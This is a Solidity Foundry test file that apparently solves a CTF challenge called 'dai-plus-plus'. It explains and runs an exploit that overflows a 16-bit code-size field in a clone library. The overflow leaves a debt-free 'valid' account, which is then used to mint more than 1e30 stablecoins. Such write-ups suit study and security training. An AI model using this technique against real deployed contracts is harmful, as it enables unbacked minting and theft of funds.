// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// Bringing the deps like Deploy.s.sol does
import "../../src/dai-plus-plus/Challenge.sol";
import "../../src/dai-plus-plus/SystemConfiguration.sol";

// Now, discovered we were using an alias at Deploy.s.sol
// because there is a collision in forge with `StdCheatsSafe.Account`
import {Account as ChallengeAccount} from "../../src/dai-plus-plus/Account.sol";

// Deploy.s.sol is able to find `AccountManager`...
import "../../src/dai-plus-plus/AccountManager.sol";

contract DaiPlusPlusTest is Test {
  address private challengeAddress;

  function setUp() public {
    // Simulating the deployment process from Deploy.s.sol
    SystemConfiguration configuration = new SystemConfiguration();
    AccountManager manager = new AccountManager(configuration);
    configuration.updateAccountManager(address(manager));
    configuration.updateStablecoin(address(new Stablecoin(configuration)));
    configuration.updateAccountImplementation(address(new ChallengeAccount()));
    configuration.updateEthUsdPriceFeed(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);
    configuration.updateSystemContract(address(manager), true);

    challengeAddress = address(new Challenge(configuration));
  }

  function testExploit() public {
    // Exploit Overview
    //
    // 1. The challenge requires that the total supply of the stablecoin exceed
    //    1e30 wei. We can only mint stablecoins via
    //    AccountManager.mintStablecoins().
    //
    // 2. mintStablecoins() requires that the supplied account be valid (i.e.
    //    validAccounts[account] == true) and that account.increaseDebt() executes
    //    without errors.
    //
    // 3. New accounts are created using AccountManager.openAccount(), which uses
    //    the ClonesWithImmutableArgs library. Upon creation, the new account is
    //    marked as valid in the AccountManager.
    //
    // 4. The clone is created by encoding:
    //       SYSTEM_CONFIGURATION, owner, recoveryAddresses.length,
    //       recoveryAddresses.
    //    The layout is:
    //      - 20 bytes: SYSTEM_CONFIGURATION address.
    //      - 20 bytes: Owner address.
    //      - 32 bytes: recoveryAddresses array length.
    //      - 32 * N bytes: N recovery addresses.
    //
    // 5. In clone(), the runtime code size (runSize) is computed as:
    //         extraLength = data.length + 2
    //         creationSize = 0x43 + extraLength
    //         runSize = creationSize - 11, which equals data.length + 0x3a.
    //
    // 6. The library only uses the lower 16 bits of runSize, meaning that if the
    //    data payload is too long, runSize will overflow modulo 2^16.
    //
    // 7. By supplying an array of 2044 recovery addresses, we force:
    //         runSize = data.length + 0x3a = 0x010002 (hex),
    //    which truncates to 0x0002 (i.e. only 2 bytes of runtime code).
    //
    // 8. With only 2 bytes of runtime code, the new account's logic is effectively
    //    disabled (account.increaseDebt() becomes a no-op), yet the account is
    //    still marked as valid.
    //
    // 9. Using the valid but non-functional account, we call mintStablecoins()
    //    to mint more than 1e30 wei of stablecoins, thereby solving the challenge.
    //
    // Solution
    //
    // - Create a new account with 2044 recovery addresses to trigger the overflow.
    // - Call mintStablecoins() using this account to mint >1e30 wei.
    //
    Challenge challenge = Challenge(challengeAddress);
    SystemConfiguration configuration = challenge.SYSTEM_CONFIGURATION();
    AccountManager manager = AccountManager(configuration.getAccountManager());

    ChallengeAccount newAccount = manager.openAccount(address(this), new address[](2044));

    manager.mintStablecoins(newAccount, 1e30 + 1, "");

    assertTrue(challenge.isSolved());
  }
}
